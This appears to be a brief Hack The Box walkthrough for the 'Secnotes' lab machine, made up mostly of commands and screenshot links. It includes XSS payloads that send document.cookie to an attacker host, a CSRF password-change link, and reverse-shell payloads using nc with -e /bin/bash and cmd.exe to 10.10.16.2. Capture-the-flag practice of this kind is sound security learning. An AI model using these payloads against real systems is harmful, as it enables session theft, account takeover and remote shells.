# Secnotes Hack The Box Tips

# ${\color{purple}Initial Recon}\ $

``nmap -sC -sV -oA secnotes 10.10.10.97 -T4``

![image](https://user-images.githubusercontent.com/123066149/222884008-60c410d5-2f11-4ba0-9ca0-4e923373cffc.png)

``nmap -p- -sV -oA fullsecnotes 10.10.10.97 -T4``

![image](https://user-images.githubusercontent.com/123066149/222884018-91569f20-cedb-46b9-9601-867252fa1fb7.png)

``nmap -p 8808 10.10.10.97 -sC -sV``

![image](https://user-images.githubusercontent.com/123066149/222884064-c39d198f-5031-4133-b41a-ef1cdf261e42.png)

``wfuzz -c -w /opt/seclists/Usernames/Names/names.txt -d"username=FUZZ&password=azeazeazeaze" --hs "No account found with that username." http://10.10.10.97/login.php``

``gobuster dir -u http://10.10.10.97/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30 -x php,asp,a
spx,txt``

![image](https://user-images.githubusercontent.com/123066149/222884045-90de364f-d65c-40aa-803e-7cef2ac312ef.png)

# ${{\color{purple}Initial Foothold}}\ $

![image](https://user-images.githubusercontent.com/123066149/222884398-3d10dbcb-9038-4dc5-88a3-5a2f0386419e.png)

![image](https://user-images.githubusercontent.com/123066149/222884441-4976e0f1-db29-46d6-a53d-79efe6cbf118.png)

![image](https://user-images.githubusercontent.com/123066149/222884462-7bd86f37-7fc8-4a1e-9c5f-f3048c40eb2e.png)

![image](https://user-images.githubusercontent.com/123066149/222884505-b9b91d4c-2550-41d4-8777-40bfc4c59c08.png)

![image](https://user-images.githubusercontent.com/123066149/222885036-d2586f9f-8521-41c2-8284-60592b21eaa6.png)

![image](https://user-images.githubusercontent.com/123066149/222885060-cdfe8f36-f9ad-4354-b31f-9a3b648ebf32.png)

![image](https://user-images.githubusercontent.com/123066149/222885186-d35f0e8f-99ea-4de2-9793-959ec4bdd345.png)

``azeazeaz<h1>MONKMODE</h1>zeeaze``

``<img src=http://10.10.16.2:800/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'10.10.16.2'$IFS'2222')>``

``<script> window.open(‘http://10.10.16.2:800/xss.php?a=’+document.cookie) </script>``

``<script> window.open(‘http://votresite.com/xss.php?a=’+document.cookie) </script>``

``<img src=http://10.10.16.2:800/?cookie='+document.cookie)>``

![ssrf](https://user-images.githubusercontent.com/123066149/222884580-628295fc-cbd2-4641-bada-5f93810077c1.PNG)

``<img src=(http://10.10.10.97/change_pass.php?password=testtest&confirm_password=testtest&submit=submit)>``

``http://10.10.10.97/change_pass.php?password=testtest&confirm_password=testtest&submit=submit``

![requet](https://user-images.githubusercontent.com/123066149/222884690-fc91298e-7252-4aa9-a2f3-8fef8ac1cf10.PNG)

``http://10.10.16.2:50/tryfortest.txt``                                     
                                        
![image](https://user-images.githubusercontent.com/123066149/222884761-67e09b9e-ee7f-4044-bb1c-2eb4799a02c3.png)
 
``nc -nvlp 50``
                                      
![3](https://user-images.githubusercontent.com/123066149/222884822-c8321bea-a8d3-41e0-9197-9e47b8e207d0.PNG)

``http://10.10.10.97/change_pass.php?password=testtest&confirm_password=testtest&submit=submit``                                        
                                        
![4](https://user-images.githubusercontent.com/123066149/222884881-42e06240-3c2a-4363-a374-c092f925050b.PNG)
                                        
![image](https://user-images.githubusercontent.com/123066149/222884939-5aca6d35-a3a1-44d2-be32-765eb2e3c451.png)                                       
                                        
# ${{\color{purple}Exploitation}}\ $
 
``smbclient -U 'tyler' //10.10.10.97/new-site``                                      
                                        
![image](https://user-images.githubusercontent.com/123066149/222890282-4e9f5ae1-159c-47cc-a0e1-7b94954f5a50.png)
                                    
![image](https://user-images.githubusercontent.com/123066149/222890258-a516a07a-8ed6-4541-ad06-7f976eb74288.png)

``http://10.10.10.97:8808/php_cmd.php?cmd=nc.exe%2010.10.16.2%201234%20-e%20cmd.exe``
                    
![image](https://user-images.githubusercontent.com/123066149/222890342-17ee1e4c-bf9b-4796-9ea5-4256f7e1ead0.png)
 
![image](https://user-images.githubusercontent.com/123066149/222890381-e2f09cd0-4d2b-4535-bf1c-8c565d380b14.png)
                   
# ${{\color{purple}Privilege Escalation}}\ $
                    
![image](https://user-images.githubusercontent.com/123066149/222890424-70d67952-7335-4f72-bb1e-c7449659e818.png)
                    
 ![image](https://user-images.githubusercontent.com/123066149/222891298-07eeb349-09d1-495e-b025-1408516d3f6b.png)                   

# ${{\color{purple}Points of Improvement}}\ $


